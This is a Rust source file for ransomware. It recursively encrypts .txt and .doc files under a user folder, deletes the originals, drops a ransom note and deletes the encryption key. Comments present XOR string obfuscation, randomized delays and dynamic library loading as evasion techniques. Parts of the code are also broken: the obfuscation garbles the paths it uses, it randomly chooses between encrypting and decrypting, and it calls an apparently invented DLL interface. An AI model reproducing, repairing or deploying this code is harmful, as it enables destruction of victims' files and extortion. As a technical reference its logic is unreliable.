extern crate aes;
extern crate rand;
extern crate walkdir;

use aes::Aes256;
use aes::cipher::{NewCipher, StreamCipher};
use aes::cipher::generic_array::GenericArray;
use rand::Rng;
use walkdir::WalkDir;
use std::fs::{File, remove_file};
use std::io::{Read, Write};
use std::path::Path;
use std::thread;
use std::time::{Duration};
use std::ptr;
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use std::ffi::CString;
use std::mem;

// Constants are obfuscated using basic XOR encryption
const BUFFER_SIZE: usize = 1024;
fn xor_string(data: &str, key: u8) -> String {
    data.bytes().map(|b| (b ^ key) as char).collect()
}

fn generate_key() -> (Vec<u8>, Vec<u8>) {
    let key: Vec<u8> = (0..32).map(|_| rand::thread_rng().gen::<u8>()).collect();
    let iv: Vec<u8> = (0..16).map(|_| rand::thread_rng().gen::<u8>()).collect();
    (key, iv)
}

fn save_key(key: &[u8], iv: &[u8]) {
    let file_name = xor_string("secret.key", 42);
    let mut key_file = File::create(&file_name).expect("Unable to create key file");
    key_file.write_all(key).expect("Unable to write key");
    key_file.write_all(iv).expect("Unable to write IV");
}

fn load_key() -> (Vec<u8>, Vec<u8>) {
    let file_name = xor_string("secret.key", 42);
    let mut key_file = File::open(&file_name).expect("Key file not found");
    let mut key = vec![0u8; 32];
    let mut iv = vec![0u8; 16];
    key_file.read_exact(&mut key).expect("Unable to read key");
    key_file.read_exact(&mut iv).expect("Unable to read IV");
    (key, iv)
}

// Polymorphism with a timing delay
fn delay_execution() {
    let delay_time = rand::thread_rng().gen_range(2..5);  // Randomized timing evasion
    thread::sleep(Duration::from_secs(delay_time));
}

// Dynamically load AES encryption functions using LoadLibrary and GetProcAddress
fn dynamic_encrypt(buffer: &mut Vec<u8>, key: &[u8], iv: &[u8]) {
    unsafe {
        let lib_name = CString::new("aes.dll").unwrap();
        let lib_handle = LoadLibraryA(lib_name.as_ptr());
        if lib_handle.is_null() {
            panic!("AES library not found");
        }
        let func_name = CString::new("AES_encrypt").unwrap();
        let func_ptr = GetProcAddress(lib_handle, func_name.as_ptr());
        if func_ptr.is_null() {
            panic!("AES_encrypt not found in library");
        }

        let encrypt_func: extern "C" fn(*mut u8, *const u8, *const u8) = mem::transmute(func_ptr);

        encrypt_func(buffer.as_mut_ptr(), key.as_ptr(), iv.as_ptr());
    }
}

fn dynamic_decrypt(buffer: &mut Vec<u8>, key: &[u8], iv: &[u8]) {
    unsafe {
        let lib_name = CString::new("aes.dll").unwrap();
        let lib_handle = LoadLibraryA(lib_name.as_ptr());
        if lib_handle.is_null() {
            panic!("AES library not found");
        }
        let func_name = CString::new("AES_decrypt").unwrap();
        let func_ptr = GetProcAddress(lib_handle, func_name.as_ptr());
        if func_ptr.is_null() {
            panic!("AES_decrypt not found in library");
        }

        let decrypt_func: extern "C" fn(*mut u8, *const u8, *const u8) = mem::transmute(func_ptr);

        decrypt_func(buffer.as_mut_ptr(), key.as_ptr(), iv.as_ptr());
    }
}

fn encrypt_file(file: &Path, key: &[u8], iv: &[u8]) {
    let mut input_file = File::open(file).expect("Unable to open file");
    let mut output_file = File::create("temp.enc").expect("Unable to create file");

    let mut buffer = vec![0u8; BUFFER_SIZE];
    while let Ok(bytes_read) = input_file.read(&mut buffer) {
        if bytes_read == 0 {
            break;
        }

        // Dynamic encryption using dynamically loaded AES function
        dynamic_encrypt(&mut buffer, key, iv);
        output_file.write_all(&buffer[..bytes_read]).expect("Error writing to file");
        delay_execution();  // Introduce timing evasion randomly
    }

    remove_file(file).expect("Unable to remove original file");
    std::fs::rename("temp.enc", file).expect("Unable to rename file");
}

fn decrypt_file(file: &Path, key: &[u8], iv: &[u8]) {
    let mut input_file = File::open(file).expect("Unable to open file");
    let mut output_file = File::create("temp.dec").expect("Unable to create file");

    let mut buffer = vec![0u8; BUFFER_SIZE];
    while let Ok(bytes_read) = input_file.read(&mut buffer) {
        if bytes_read == 0 {
            break;
        }

        // Dynamic decryption using dynamically loaded AES function
        dynamic_decrypt(&mut buffer, key, iv);
        output_file.write_all(&buffer[..bytes_read]).expect("Error writing to file");
        delay_execution();  // Obfuscate the control flow
    }

    remove_file(file).expect("Unable to remove original file");
    std::fs::rename("temp.dec", file).expect("Unable to rename file");
}

fn process_directory(op: fn(&Path, &[u8], &[u8]), folder: &str, key: &[u8], iv: &[u8]) {
    for entry in WalkDir::new(folder).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let path = entry.path();
            if path.extension().map_or(false, |ext| ext == xor_string("txt", 42) || ext == xor_string("doc", 42)) {
                op(path, key, iv);
                println!("Processed {:?}", path);
            }
        }
    }
}

fn encrypt_directory(folder: &str, key: &[u8], iv: &[u8]) {
    process_directory(encrypt_file, folder, key, iv);
}

fn decrypt_directory(folder: &str, key: &[u8], iv: &[u8]) {
    process_directory(decrypt_file, folder, key, iv);
}

fn create_ransom_note() {
    let mut note_file = File::create("C:\\Users\\YourUser\\ransom_note.txt").expect("Unable to create ransom note");
    let note_content = xor_string("Your files have been encrypted!", 42);
    writeln!(note_file, "{}", note_content).expect("Error writing ransom note");
}

fn main() {
    let folder_path = xor_string("C:\\Users\\YourUser", 42);

    let (key, iv) = generate_key();
    save_key(&key, &iv);

    let random_action: u8 = rand::thread_rng().gen();
    if random_action % 2 == 0 {
        println!("Encrypting files...");
        encrypt_directory(&folder_path, &key, &iv);
    } else {
        println!("Decrypting files...");
        decrypt_directory(&folder_path, &key, &iv);
    }

    create_ransom_note();

    remove_file(&xor_string("secret.key", 42)).expect("Unable to remove key file");
    println!("Ransom note created. Key removed.");
}

